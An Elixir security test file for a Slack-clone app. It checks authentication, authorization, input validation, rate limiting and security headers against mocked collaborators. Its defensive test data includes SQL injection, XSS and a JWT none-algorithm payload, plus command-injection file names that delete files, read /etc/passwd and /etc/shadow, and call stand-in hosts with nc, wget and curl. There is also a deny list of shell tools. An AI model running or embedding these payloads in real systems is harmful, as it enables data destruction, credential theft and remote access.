defmodule SlackClone.Security.AuthenticationSecurityTest do
  @moduledoc """
  Comprehensive security testing for authentication system using London School TDD approach.
  
  Tests authentication bypass attempts, authorization boundary tests, input validation,
  and rate limiting with extensive mock verification of security collaborator behavior.
  """
  
  use SlackCloneWeb.ConnCase
  import Mox
  import SlackClone.Factory

  alias SlackClone.{Accounts, Auth}
  alias SlackCloneWeb.Guardian

  # Mock external security dependencies
  setup :verify_on_exit!
  setup :set_mox_from_context

  describe "Authentication Bypass Prevention" do
    setup do
      user = build(:user, 
        id: "user-id",
        email: "test@example.com", 
        password_hash: Argon2.hash_pwd_salt("correct_password")
      )
      
      %{user: user}
    end

    test "prevents authentication bypass via malformed JWT tokens", %{user: user} do
      malicious_tokens = [
        "malformed.jwt.token",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.MALFORMED.signature",
        "",
        nil,
        "Bearer malicious-token",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VyX2lkIjoiYWRtaW4ifQ==.", # None algorithm attack
      ]

      # Mock guardian behavior for malicious tokens
      MockGuardian
      |> expect(:decode_and_verify, length(malicious_tokens), fn _token ->
        {:error, :invalid_token}
      end)

      # Mock security logging
      MockSecurityLogger
      |> expect(:log_security_event, length(malicious_tokens), fn %{
        event: "invalid_token_attempt",
        token: token,
        ip_address: _ip
      } ->
        refute token in ["", nil], "Should not log empty/nil tokens"
        :ok
      end)

      Enum.each(malicious_tokens, fn malicious_token ->
        conn = build_conn()
        |> put_req_header("authorization", "Bearer #{malicious_token}")
        |> put_req_header("x-forwarded-for", "192.168.1.100")

        conn = Auth.authenticate_request(conn)
        
        # Should reject authentication
        refute conn.assigns[:current_user]
        assert conn.status in [401, 403]
      end)
    end

    test "prevents SQL injection in authentication queries", %{user: user} do
      sql_injection_payloads = [
        "admin'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users WHERE admin = 1 --",
        "'; UPDATE users SET admin = 1 WHERE id = 1; --",
        "admin'/**/OR/**/1=1--"
      ]

      # Mock repository to verify SQL injection attempts are properly escaped
      MockRepo
      |> expect(:get_by, length(sql_injection_payloads), fn User, [email: email] ->
        # Verify that the email is properly escaped and doesn't contain SQL
        refute String.contains?(email, "DROP TABLE")
        refute String.contains?(email, "UNION SELECT")
        refute String.contains?(email, "UPDATE")
        refute String.contains?(email, "--")
        
        nil # No user found for malicious email
      end)

      # Mock security event logging
      MockSecurityLogger
      |> expect(:log_security_event, length(sql_injection_payloads), fn %{
        event: "sql_injection_attempt",
        email: email,
        ip_address: _ip
      } ->
        assert String.contains?(email, "DROP TABLE") or 
               String.contains?(email, "UNION SELECT") or
               String.contains?(email, "UPDATE") or
               String.contains?(email, "OR")
        :ok
      end)

      Enum.each(sql_injection_payloads, fn payload ->
        result = Accounts.authenticate_user(payload, "any_password")
        
        # Should always fail authentication
        assert {:error, :invalid_credentials} = result
      end)
    end

    test "prevents timing attacks on password verification", %{user: user} do
      # Mock user lookup to control timing
      MockRepo
      |> expect(:get_by, 4, fn User, [email: email] ->
        case email do
          "test@example.com" -> user
          _ -> nil
        end
      end)

      # Mock password verification with controlled timing
      MockArgon2
      |> expect(:verify_pass, 2, fn password, hash ->
        # Simulate realistic password hashing time
        :timer.sleep(100)
        password == "correct_password" && hash == user.password_hash
      end)
      |> expect(:no_user_verify, 2, fn ->
        # Ensure constant time operation even when user doesn't exist
        :timer.sleep(100)
        false
      end)

      # Test legitimate user with correct password
      {time1, {:ok, authenticated_user}} = :timer.tc(fn ->
        Accounts.authenticate_user("test@example.com", "correct_password")
      end)

      # Test legitimate user with wrong password
      {time2, {:error, :invalid_credentials}} = :timer.tc(fn ->
        Accounts.authenticate_user("test@example.com", "wrong_password")
      end)

      # Test non-existent user
      {time3, {:error, :invalid_credentials}} = :timer.tc(fn ->
        Accounts.authenticate_user("nonexistent@example.com", "any_password")
      end)

      # Test non-existent user with different password
      {time4, {:error, :invalid_credentials}} = :timer.tc(fn ->
        Accounts.authenticate_user("another@example.com", "different_password")
      end)

      # Convert to milliseconds
      times = [time1, time2, time3, time4] |> Enum.map(&(&1 / 1000))
      
      # Verify timing consistency (all should be around 100ms ± tolerance)
      avg_time = Enum.sum(times) / length(times)
      max_deviation = Enum.max(Enum.map(times, &abs(&1 - avg_time)))
      
      # Allow 20ms tolerance for timing variations
      assert max_deviation < 20, 
        "Timing attack vulnerability: max deviation #{max_deviation}ms exceeds 20ms threshold. Times: #{inspect(times)}"
    end

    test "prevents password brute force attacks with account lockout", %{user: user} do
      failed_attempts = 6 # One more than the lockout threshold
      
      # Mock user lookup
      MockRepo
      |> expect(:get_by, failed_attempts + 1, fn User, [email: "test@example.com"] ->
        user
      end)

      # Mock failed login tracking
      MockAccountSecurity
      |> expect(:record_failed_login, failed_attempts, fn user_id, ip_address ->
        assert user_id == user.id
        assert ip_address == "192.168.1.100"
        :ok
      end)
      |> expect(:is_account_locked?, failed_attempts + 1, fn user_id ->
        failed_count = MockAccountSecurity.get_failed_attempts_count(user_id)
        failed_count >= 5
      end)
      |> expect(:get_failed_attempts_count, failed_attempts + 1, fn user_id ->
        # Simulate increasing failed attempts
        Process.get({:failed_attempts, user_id}, 0)
      end)

      # Mock security event logging
      MockSecurityLogger
      |> expect(:log_security_event, failed_attempts + 1, fn event ->
        assert event.event in ["failed_login_attempt", "account_locked"]
        assert event.user_id == user.id
        :ok
      end)

      # Simulate failed login attempts
      Enum.each(1..failed_attempts, fn attempt ->
        # Track attempt count for mocking
        Process.put({:failed_attempts, user.id}, attempt)
        
        result = Accounts.authenticate_user("test@example.com", "wrong_password")
        
        if attempt <= 5 do
          assert {:error, :invalid_credentials} = result
        else
          assert {:error, :account_locked} = result
        end
      end)

      # Verify account remains locked even with correct password
      result = Accounts.authenticate_user("test@example.com", "correct_password")
      assert {:error, :account_locked} = result
    end

    test "enforces secure session management", %{user: user} do
      # Mock session creation with secure attributes
      MockSessionManager
      |> expect(:create_session, fn user_id, conn_info ->
        assert user_id == user.id
        
        session = %{
          id: "secure-session-id",
          user_id: user_id,
          ip_address: conn_info.ip_address,
          user_agent: conn_info.user_agent,
          created_at: DateTime.utc_now(),
          expires_at: DateTime.add(DateTime.utc_now(), 24 * 60 * 60), # 24 hours
          secure: true,
          http_only: true,
          same_site: :strict
        }
        
        {:ok, session}
      end)

      # Mock security validation
      MockSessionValidator
      |> expect(:validate_session, fn session, current_conn_info ->
        # Verify session security properties
        assert session.secure == true
        assert session.http_only == true
        assert session.same_site == :strict
        
        # Verify IP address hasn't changed (session fixation prevention)
        assert session.ip_address == current_conn_info.ip_address
        
        {:ok, session}
      end)

      conn = build_conn()
      |> put_req_header("x-forwarded-for", "192.168.1.100")
      |> put_req_header("user-agent", "Test Browser/1.0")

      # Create authenticated session
      {:ok, session} = SessionManager.create_session(user.id, %{
        ip_address: "192.168.1.100",
        user_agent: "Test Browser/1.0"
      })

      # Validate session security properties
      assert session.secure == true
      assert session.http_only == true
      assert session.same_site == :strict
      
      # Verify session expires within reasonable time
      time_diff = DateTime.diff(session.expires_at, session.created_at)
      assert time_diff <= 24 * 60 * 60, "Session expires too late"
      assert time_diff >= 30 * 60, "Session expires too soon"
    end
  end

  describe "Authorization Boundary Testing" do
    setup do
      admin_user = build(:user, id: "admin-id", role: :admin)
      regular_user = build(:user, id: "user-id", role: :user)
      workspace = build(:workspace, id: "workspace-id")
      private_channel = build(:channel, id: "private-channel-id", workspace: workspace, private: true)
      public_channel = build(:channel, id: "public-channel-id", workspace: workspace, private: false)
      
      %{
        admin_user: admin_user,
        regular_user: regular_user,
        workspace: workspace,
        private_channel: private_channel,
        public_channel: public_channel
      }
    end

    test "prevents privilege escalation through parameter manipulation", %{regular_user: regular_user, admin_user: admin_user} do
      # Mock authorization service
      MockAuthz
      |> expect(:can_perform_admin_action?, 3, fn user, _action ->
        user.role == :admin
      end)

      # Mock security logging
      MockSecurityLogger
      |> expect(:log_security_event, 3, fn %{event: "privilege_escalation_attempt"} ->
        :ok
      end)

      privilege_escalation_attempts = [
        %{"role" => "admin"},
        %{"admin" => true},
        %{"permissions" => ["admin", "superuser"]}
      ]

      Enum.each(privilege_escalation_attempts, fn malicious_params ->
        # Attempt to perform admin action with manipulated parameters
        result = Auth.authorize_admin_action(regular_user, :delete_user, malicious_params)
        
        # Should always deny authorization
        assert {:error, :unauthorized} = result
      end)

      # Verify legitimate admin can still perform actions
      result = Auth.authorize_admin_action(admin_user, :delete_user, %{})
      assert {:ok, :authorized} = result
    end

    test "enforces channel access controls", %{regular_user: regular_user, private_channel: private_channel, public_channel: public_channel} do
      # Mock channel membership checks
      MockChannels
      |> expect(:is_channel_member?, 4, fn user_id, channel_id ->
        # Regular user is only member of public channel
        user_id == regular_user.id && channel_id == public_channel.id
      end)

      # Mock authorization service
      MockAuthz
      |> expect(:can_view_channel?, 2, fn user, channel ->
        # Check both membership and channel privacy
        if channel.private do
          MockChannels.is_channel_member?(user.id, channel.id)
        else
          true # Public channels viewable by all
        end
      end)
      |> expect(:can_post_message?, 2, fn user, channel ->
        # Must be member to post in any channel
        MockChannels.is_channel_member?(user.id, channel.id)
      end)

      # Test public channel access (should succeed)
      assert {:ok, :authorized} = Auth.authorize_channel_access(regular_user, public_channel, :view)
      assert {:ok, :authorized} = Auth.authorize_channel_access(regular_user, public_channel, :post_message)

      # Test private channel access (should fail)
      assert {:error, :unauthorized} = Auth.authorize_channel_access(regular_user, private_channel, :view)
      assert {:error, :unauthorized} = Auth.authorize_channel_access(regular_user, private_channel, :post_message)
    end

    test "prevents horizontal privilege escalation between users", %{regular_user: regular_user} do
      other_user = build(:user, id: "other-user-id")
      victim_message = build(:message, id: "victim-message-id", user_id: other_user.id)
      user_message = build(:message, id: "user-message-id", user_id: regular_user.id)

      # Mock authorization checks
      MockAuthz
      |> expect(:can_edit_message?, 2, fn user, message ->
        user.id == message.user_id
      end)
      |> expect(:can_delete_message?, 2, fn user, message ->
        user.id == message.user_id
      end)

      # Mock security logging
      MockSecurityLogger
      |> expect(:log_security_event, 2, fn %{event: "unauthorized_message_access"} ->
        :ok
      end)

      # Attempt to edit another user's message (should fail)
      result = Auth.authorize_message_action(regular_user, victim_message, :edit)
      assert {:error, :unauthorized} = result

      # Attempt to delete another user's message (should fail)
      result = Auth.authorize_message_action(regular_user, victim_message, :delete)
      assert {:error, :unauthorized} = result

      # Verify user can edit own message
      result = Auth.authorize_message_action(regular_user, user_message, :edit)
      assert {:ok, :authorized} = result
    end

    test "validates workspace access boundaries", %{regular_user: regular_user, workspace: workspace} do
      restricted_workspace = build(:workspace, id: "restricted-workspace-id", access_level: :private)
      
      # Mock workspace membership
      MockWorkspaces
      |> expect(:is_workspace_member?, 4, fn user_id, workspace_id ->
        # User is only member of the main workspace
        user_id == regular_user.id && workspace_id == workspace.id
      end)

      # Mock authorization service
      MockAuthz
      |> expect(:can_access_workspace?, 2, fn user, ws ->
        MockWorkspaces.is_workspace_member?(user.id, ws.id)
      end)

      # Test authorized workspace access
      result = Auth.authorize_workspace_access(regular_user, workspace)
      assert {:ok, :authorized} = result

      # Test unauthorized workspace access
      result = Auth.authorize_workspace_access(regular_user, restricted_workspace)
      assert {:error, :unauthorized} = result
    end
  end

  describe "Input Validation and Sanitization" do
    test "prevents XSS attacks in message content" do
      xss_payloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "';alert('XSS');//"
      ]

      # Mock content sanitizer
      MockSanitizer
      |> expect(:sanitize_html, length(xss_payloads), fn content ->
        # Verify dangerous content is properly escaped/removed
        sanitized = String.replace(content, ~r/<script.*?>.*?<\/script>/i, "")
        sanitized = String.replace(sanitized, ~r/javascript:/i, "")
        sanitized = String.replace(sanitized, ~r/on\w+=/i, "")
        sanitized
      end)

      # Mock security logging
      MockSecurityLogger
      |> expect(:log_security_event, length(xss_payloads), fn %{
        event: "xss_attempt",
        content: content,
        sanitized_content: sanitized
      } ->
        refute content == sanitized, "XSS payload should be modified during sanitization"
        :ok
      end)

      Enum.each(xss_payloads, fn payload ->
        sanitized = MockSanitizer.sanitize_html(payload)
        
        # Verify dangerous content is neutralized
        refute String.contains?(String.downcase(sanitized), "<script")
        refute String.contains?(String.downcase(sanitized), "javascript:")
        refute String.contains?(String.downcase(sanitized), "onerror=")
        refute String.contains?(String.downcase(sanitized), "onload=")
      end)
    end

    test "validates file upload security" do
      malicious_files = [
        %{filename: "malware.exe", content_type: "application/x-executable", size: 1024},
        %{filename: "script.php", content_type: "application/x-php", size: 512},
        %{filename: "payload.jsp", content_type: "application/x-jsp", size: 256},
        %{filename: "backdoor.aspx", content_type: "application/x-aspx", size: 2048},
        %{filename: "innocent.jpg", content_type: "image/jpeg", size: 50_000_000}, # Too large
        %{filename: "../../../etc/passwd", content_type: "text/plain", size: 1024}, # Path traversal
      ]

      # Mock file validator
      MockFileValidator
      |> expect(:validate_file, length(malicious_files), fn file ->
        cond do
          file.content_type in ["application/x-executable", "application/x-php", "application/x-jsp", "application/x-aspx"] ->
            {:error, :dangerous_file_type}
          
          file.size > 10_000_000 ->
            {:error, :file_too_large}
          
          String.contains?(file.filename, "..") ->
            {:error, :invalid_filename}
          
          true ->
            {:ok, file}
        end
      end)

      # Mock security logging
      MockSecurityLogger
      |> expect(:log_security_event, length(malicious_files), fn %{event: "malicious_file_upload"} ->
        :ok
      end)

      Enum.each(malicious_files, fn malicious_file ->
        result = MockFileValidator.validate_file(malicious_file)
        
        # Should reject all malicious files
        assert {:error, _reason} = result
      end)

      # Verify legitimate file passes validation
      legitimate_file = %{
        filename: "document.pdf",
        content_type: "application/pdf",
        size: 1_000_000 # 1MB
      }
      
      MockFileValidator
      |> expect(:validate_file, fn file ->
        {:ok, file}
      end)
      
      result = MockFileValidator.validate_file(legitimate_file)
      assert {:ok, ^legitimate_file} = result
    end

    test "prevents command injection in system operations" do
      command_injection_payloads = [
        "filename.txt; rm -rf /",
        "document.pdf && cat /etc/passwd",
        "image.jpg | nc attacker.com 4444",
        "file.txt; wget http://evil.com/malware.sh",
        "data.csv $(curl http://attacker.com)",
        "report.pdf `cat /etc/shadow`"
      ]

      # Mock system command validator
      MockSystemValidator
      |> expect(:validate_filename, length(command_injection_payloads), fn filename ->
        # Check for command injection patterns
        dangerous_patterns = [";", "&&", "|", "$", "`", "$(", "cat ", "rm ", "wget ", "curl "]
        
        if Enum.any?(dangerous_patterns, &String.contains?(filename, &1)) do
          {:error, :invalid_filename}
        else
          {:ok, filename}
        end
      end)

      # Mock security logging
      MockSecurityLogger
      |> expect(:log_security_event, length(command_injection_payloads), fn %{
        event: "command_injection_attempt",
        filename: filename
      } ->
        assert String.contains?(filename, ";") or 
               String.contains?(filename, "&&") or
               String.contains?(filename, "|") or
               String.contains?(filename, "$")
        :ok
      end)

      Enum.each(command_injection_payloads, fn payload ->
        result = MockSystemValidator.validate_filename(payload)
        
        # Should reject all command injection attempts
        assert {:error, :invalid_filename} = result
      end)
    end
  end

  describe "Rate Limiting Security" do
    setup do
      user = build(:user, id: "rate-limit-user")
      %{user: user}
    end

    test "enforces authentication rate limiting", %{user: user} do
      # Mock rate limiter
      MockRateLimiter
      |> expect(:check_rate_limit, 12, fn key, limit, window ->
        # Extract attempt number from process state
        current_attempts = Process.get({:attempts, key}, 0)
        Process.put({:attempts, key}, current_attempts + 1)
        
        if current_attempts < limit do
          {:ok, %{remaining: limit - current_attempts - 1}}
        else
          {:error, :rate_limited}
        end
      end)

      # Mock security logging
      MockSecurityLogger
      |> expect(:log_security_event, 2, fn %{event: "rate_limit_exceeded"} ->
        :ok
      end)

      ip_address = "192.168.1.100"
      
      # Attempt authentication beyond rate limit (10 attempts in 15 minutes)
      results = Enum.map(1..12, fn _attempt ->
        Auth.rate_limited_authenticate(user.email, "wrong_password", ip_address)
      end)

      # First 10 should succeed rate limiting check (but fail auth)
      successful_rate_checks = Enum.take(results, 10)
      Enum.each(successful_rate_checks, fn result ->
        # Rate limit passed, but auth failed
        assert {:error, :invalid_credentials} = result or {:ok, :rate_limit_passed} = result
      end)

      # Last 2 should be rate limited
      rate_limited_results = Enum.drop(results, 10)
      Enum.each(rate_limited_results, fn result ->
        assert {:error, :rate_limited} = result
      end)
    end

    test "enforces API endpoint rate limiting", %{user: user} do
      # Mock API rate limiter with different limits per endpoint
      MockAPIRateLimiter
      |> expect(:check_endpoint_rate_limit, 25, fn user_id, endpoint, limit ->
        key = "#{user_id}:#{endpoint}"
        current_requests = Process.get({:api_requests, key}, 0)
        Process.put({:api_requests, key}, current_requests + 1)
        
        if current_requests < limit do
          {:ok, %{remaining: limit - current_requests - 1}}
        else
          {:error, :rate_limited}
        end
      end)

      # Mock security event logging
      MockSecurityLogger
      |> expect(:log_security_event, 3, fn %{event: "api_rate_limit_exceeded"} ->
        :ok
      end)

      # Test different endpoints with different limits
      endpoint_tests = [
        %{endpoint: "/api/messages", limit: 10, attempts: 12},
        %{endpoint: "/api/files/upload", limit: 5, attempts: 7},
        %{endpoint: "/api/users/search", limit: 20, attempts: 22}
      ]

      Enum.each(endpoint_tests, fn %{endpoint: endpoint, limit: limit, attempts: attempts} ->
        results = Enum.map(1..attempts, fn _attempt ->
          Auth.check_api_rate_limit(user.id, endpoint, limit)
        end)

        # Verify rate limiting behavior
        successful_requests = Enum.take(results, limit)
        rate_limited_requests = Enum.drop(results, limit)

        Enum.each(successful_requests, fn result ->
          assert {:ok, %{remaining: _}} = result
        end)

        Enum.each(rate_limited_requests, fn result ->
          assert {:error, :rate_limited} = result
        end)
      end)
    end

    test "prevents distributed brute force attacks", %{user: user} do
      # Simulate attacks from multiple IP addresses
      attacker_ips = ["10.0.0.1", "10.0.0.2", "10.0.0.3", "192.168.1.50", "203.0.113.1"]
      
      # Mock distributed rate limiter
      MockDistributedRateLimiter
      |> expect(:check_distributed_rate_limit, 30, fn user_email, ip_address ->
        # Track attempts per IP and globally per user
        ip_key = "ip:#{ip_address}"
        user_key = "user:#{user_email}"
        
        ip_attempts = Process.get({:attempts, ip_key}, 0)
        user_attempts = Process.get({:attempts, user_key}, 0)
        
        Process.put({:attempts, ip_key}, ip_attempts + 1)
        Process.put({:attempts, user_key}, user_attempts + 1)
        
        cond do
          ip_attempts >= 5 -> {:error, :ip_rate_limited}
          user_attempts >= 15 -> {:error, :user_rate_limited}
          true -> {:ok, %{remaining: 15 - user_attempts - 1}}
        end
      end)

      # Mock security monitoring
      MockSecurityLogger
      |> expect(:log_security_event, 15, fn event ->
        assert event.event in ["distributed_attack_detected", "ip_rate_limited", "user_rate_limited"]
        :ok
      end)

      # Simulate distributed attack
      attack_results = Enum.flat_map(attacker_ips, fn ip ->
        Enum.map(1..6, fn _attempt ->
          Auth.distributed_rate_limit_check(user.email, ip)
        end)
      end)

      # Analyze results
      rate_limited_count = Enum.count(attack_results, &match?({:error, _}, &1))
      successful_count = Enum.count(attack_results, &match?({:ok, _}, &1))

      # Should have blocked most attempts due to rate limiting
      assert rate_limited_count > successful_count
      assert rate_limited_count >= 15 # At least some IPs and user should be rate limited
    end
  end

  describe "Security Headers and HTTPS Enforcement" do
    test "enforces security headers on all responses" do
      # Mock security header validator
      MockSecurityHeaders
      |> expect(:validate_security_headers, fn headers ->
        required_headers = %{
          "strict-transport-security" => "max-age=31536000; includeSubDomains",
          "x-content-type-options" => "nosniff",
          "x-frame-options" => "DENY",
          "x-xss-protection" => "1; mode=block",
          "content-security-policy" => "default-src 'self'",
          "referrer-policy" => "strict-origin-when-cross-origin"
        }

        missing_headers = Enum.filter(required_headers, fn {header, _expected_value} ->
          not Map.has_key?(headers, header)
        end)

        if Enum.empty?(missing_headers) do
          {:ok, :all_headers_present}
        else
          {:error, {:missing_headers, missing_headers}}
        end
      end)

      # Test response headers
      security_headers = %{
        "strict-transport-security" => "max-age=31536000; includeSubDomains",
        "x-content-type-options" => "nosniff", 
        "x-frame-options" => "DENY",
        "x-xss-protection" => "1; mode=block",
        "content-security-policy" => "default-src 'self'",
        "referrer-policy" => "strict-origin-when-cross-origin"
      }

      result = MockSecurityHeaders.validate_security_headers(security_headers)
      assert {:ok, :all_headers_present} = result

      # Test missing headers
      incomplete_headers = Map.drop(security_headers, ["strict-transport-security", "x-frame-options"])
      result = MockSecurityHeaders.validate_security_headers(incomplete_headers)
      assert {:error, {:missing_headers, missing}} = result
      assert length(missing) == 2
    end

    test "enforces HTTPS-only communication" do
      # Mock HTTPS validator
      MockHTTPSValidator
      |> expect(:validate_https_request, 3, fn conn ->
        scheme = conn.scheme
        if scheme == :https do
          {:ok, :secure_connection}
        else
          {:error, :insecure_connection}
        end
      end)

      # Test HTTPS request (should pass)
      https_conn = %{scheme: :https, host: "app.slackclone.com"}
      result = MockHTTPSValidator.validate_https_request(https_conn)
      assert {:ok, :secure_connection} = result

      # Test HTTP requests (should fail)
      http_conn = %{scheme: :http, host: "app.slackclone.com"}
      result = MockHTTPSValidator.validate_https_request(http_conn)
      assert {:error, :insecure_connection} = result

      # Test localhost HTTP (might be allowed in development)
      localhost_conn = %{scheme: :http, host: "localhost"}
      result = MockHTTPSValidator.validate_https_request(localhost_conn)
      # In production, this should also fail
      assert {:error, :insecure_connection} = result
    end
  end
end